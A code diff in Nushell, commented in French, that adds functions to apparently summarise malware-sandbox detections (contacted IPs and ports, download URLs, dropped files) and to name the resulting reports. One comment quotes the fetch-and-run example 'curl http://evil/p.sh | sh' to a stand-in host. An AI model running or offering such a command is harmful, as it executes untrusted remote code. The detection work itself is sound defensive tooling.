@@ -395,6 +395,115 @@ export def show_family [base, family: string, num: int, explore: bool] {
 }
 
 # =====================================================================
+# ---- Bilan : IP / ports / URLs de téléchargement --------------------
+# =====================================================================
+# Construit un bilan consolidé à partir des familles réseau et fichiers déjà
+# détectées. Renvoie une liste de lignes markdown à intégrer au rapport :
+#   - IP de destination (publiques / egress) et ports contactés, dédupliqués,
+#     avec le nombre de connexions et les familles de détection concernées ;
+#   - URLs et commandes de téléchargement de malware (curl/wget … piped) et
+#     fichiers déposés (binaires dans /tmp, /dev/shm, …).
+# Fonctionne en autonome depuis le base brut (re-détecte les familles utiles).
+export def report_bilan [base, num: int = 50] {
+    mut lines = [ "## Bilan — IP, ports et téléchargements" "" ]
+
+    # Familles pertinentes (détection réutilisée pour rester cohérent).
+    let connects = (detect_connect $base | polars collect | polars into-nu)
+    let sends    = (detect_send_data $base | polars collect | polars into-nu)
+    let execves  = (detect_execve $base | polars collect | polars into-nu)
+    let files    = (detect_file_create $base | polars collect | polars into-nu)
+
+    # ---- 1. IP/port contactés (egress public + ports inhabituels) ----
+    let ipports = ((
+            $connects | select dst_ip dst_port
+        ) | append ($sends | select dst_ip dst_port))
+    let ip_by_port = ($ipports
+        | group-by {|r| $"(($r.dst_ip | into string)):($r.dst_port)" }
+        | items {|k, rows|
+            { ip: ($rows.0.dst_ip | into string)
+              port: ($rows.0.dst_port | into int)
+              count: ($rows | length) } }
+        | sort-by count --reverse)
+
+    $lines = ($lines | append "### IP / ports détectés")
+    if ($ip_by_port | is-empty) {
+        $lines = ($lines | append "_Aucune connexion sortante suspecte détectée._")
+    } else {
+        $lines = ($lines | append [ "| IP | Port | Connexions |" "|---|---|---|" ])
+        for r in ($ip_by_port | first $num) {
+            $lines = ($lines | append $"| ($r.ip) | ($r.port) | ($r.count) |")
+        }
+        if ($ip_by_port | length) > $num {
+            $lines = ($lines | append $"… et (($ip_by_port | length) - $num) autres couples IP:port")
+        }
+    }
+    $lines = ($lines | append "")
+
+    # ---- 2. URLs de téléchargement de malware ----
+    # Extraction des URLs http(s) dans les command lines des alertes execve,
+    # connect, send_data (ex. "curl http://evil/p.sh | sh").
+    let urls = (
+        ($execves | get command_line)
+        | append ($connects | get command_line)
+        | append ($sends | get command_line)
+        | each {|c|
+            ($c | split row ' '
+                | where {|w| ($w | str starts-with 'http') }
+                | each {|w| $w | str trim -c '"' | str trim -c "'" }) 
+          }
+        | flatten
+        | where {|w| not ($w | is-empty) }
+        | uniq
+    )
+
+    $lines = ($lines | append "### URLs de téléchargement")
+    if ($urls | is-empty) {
+        $lines = ($lines | append "_Aucune URL de téléchargement détectée dans les commandes._")
+    } else {
+        for u in ($urls | first $num) { $lines = ($lines | append $"- `($u)`") }
+    }
+    $lines = ($lines | append "")
+
+    # ---- 3. Fichiers déposés (drop-and-run, persistance) ----
+    # main_path n'existe que si le format expose des évènements file_create.
+    let file_cols = ($files | columns)
+    $lines = ($lines | append "### Fichiers déposés / persistants")
+    if ("main_path" not-in $file_cols) or ($files | is-empty) {
+        $lines = ($lines | append "_Aucun fichier suspect déposé._")
+    } else {
+        for p in (($files | get main_path | uniq) | first $num) { $lines = ($lines | append $"- `($p)`") }
+    }
+    $lines = ($lines | append "")
+
+    $lines
+}
+
+# =====================================================================
+# ---- Nommage des rapports -------------------------------------------
+# =====================================================================
+# Liste canonique des familles de détection (triée) : utilisée pour construire
+# le nom descriptif d'un rapport. Toute famille de détection vit ici, au niveau
+# de la procédure de détection, pas dans les wrappers.
+export def report_families [] {
+    ['execve','file_create','connect','send_data','dns_query','kill',
+     'bpf_prog_load','mmap_exec','prctl']
+}
+
+# Nom descriptif d'un rapport, construit à partir des familles de détection
+# DÉTECTÉES (famille+nombre d'alertes), précédées du hash court de l'échantillon.
+# Reçoit le hash source et le nb d'alertes par famille (record fam -> n).
+# Ex : 15e67237_execve1_connect35_send_data9286_dns_query2_prctl3.md
+export def report_basename [hash: string, fam_counts: record] {
+    let short = ($hash | str substring 0..7)
+    let sig = ($fam_counts
+        | items {|fam, n| if ($n | into int) > 0 { $"($fam)($n)" } else { null } }
+        | where {|v| $v != null }
+        | str join "_")
+    let label = if ($sig | is-empty) { "aucune_alerte" } else { $sig }
+    $"($short)_($label)"
+}
+
+# =====================================================================
 # ---- MAIN ------------------------------------------------------------
 # =====================================================================
 def main [
